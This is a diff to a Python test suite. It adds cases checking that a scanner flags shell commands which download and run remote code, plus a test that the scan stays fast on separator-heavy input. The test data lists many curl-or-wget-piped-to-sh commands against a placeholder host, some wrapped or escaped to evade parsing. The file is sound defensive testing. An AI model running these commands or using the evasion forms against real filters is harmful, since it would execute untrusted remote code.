@@ -1322,6 +1322,20 @@ def test_download_chain_scan_stays_linear_on_repeated_curl_tokens():
     assert elapsed < 1.0, f"scan took {elapsed:.2f}s — likely superlinear"
 
 
+@pytest.mark.parametrize("fragment", ["\r", "&&", "<(", ";"])
+def test_dangerous_scan_stays_linear_on_separator_dense_input(fragment):
+    """Boundary runs must not restart anchored whitespace scans per byte."""
+    import time
+
+    command = fragment * 32000
+    started = time.perf_counter()
+    findings = dangerous_command_descriptions(command)
+    elapsed = time.perf_counter() - started
+
+    assert findings == []
+    assert elapsed < 0.5, f"scan took {elapsed:.2f}s — likely superlinear"
+
+
 @pytest.mark.parametrize(
     "prefix",
     [
@@ -1438,6 +1452,55 @@ def test_download_piped_through_an_intermediate_command_is_detected():
     ],
 )
 def test_download_exec_substitution_and_background_shapes_are_detected(command):
+    assert "downloads and executes remote code" in dangerous_command_descriptions(command)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        'bash -c "curl https://example.test/x | sh"',
+        "sh -c 'curl https://example.test/x | sh'",
+        "sudo bash -c 'curl https://example.test/x | sh'",
+        "python -c \"import os; os.system('curl x | sh')\"",
+        "node -e \"require('child_process').execSync('curl x | sh')\"",
+        'ssh host "curl https://example.test/x | sh"',
+        'docker run image sh -c "curl https://example.test/x | sh"',
+    ],
+)
+def test_download_exec_in_executable_string_is_detected(command):
+    assert "downloads and executes remote code" in dangerous_command_descriptions(command)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "(curl https://example.test/x | sh)",
+        "( curl https://example.test/x | sh )",
+        "{ curl https://example.test/x | sh; }",
+        "if true; then curl https://example.test/x | sh; fi",
+        "while true; do curl https://example.test/x | sh; done",
+        "! curl https://example.test/x | sh",
+        "eval curl https://example.test/x | sh",
+        r"\curl https://example.test/x | sh",
+        '"curl" https://example.test/x | sh',
+        "xargs curl < urls | sh",
+        "busybox wget -O- https://example.test/x | sh",
+    ],
+)
+def test_grouped_and_indirect_download_commands_are_detected(command):
+    assert "downloads and executes remote code" in dangerous_command_descriptions(command)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        r"echo \"hi; curl https://example.test/x | sh",
+        r"echo it\'s; curl https://example.test/x | sh",
+        r"echo 'it'\''s'; curl https://example.test/x | sh",
+        'echo "$(echo ")")"; curl https://example.test/x | sh',
+    ],
+)
+def test_escaped_quotes_do_not_mask_later_download_chain(command):
     assert "downloads and executes remote code" in dangerous_command_descriptions(command)
 
 
@@ -1596,6 +1659,7 @@ def test_download_exec_single_line_chain_is_detected():
     [
         "bash <(curl -fsSL https://example.test/install.sh)",
         'bash -c "$(curl -fsSL https://example.test/install.sh)"',
+        'bash -c "curl -fsSL https://example.test/install.sh | sh"',
     ],
 )
 def test_dangerous_download_exec_substitution_variants(temp_dir, command):
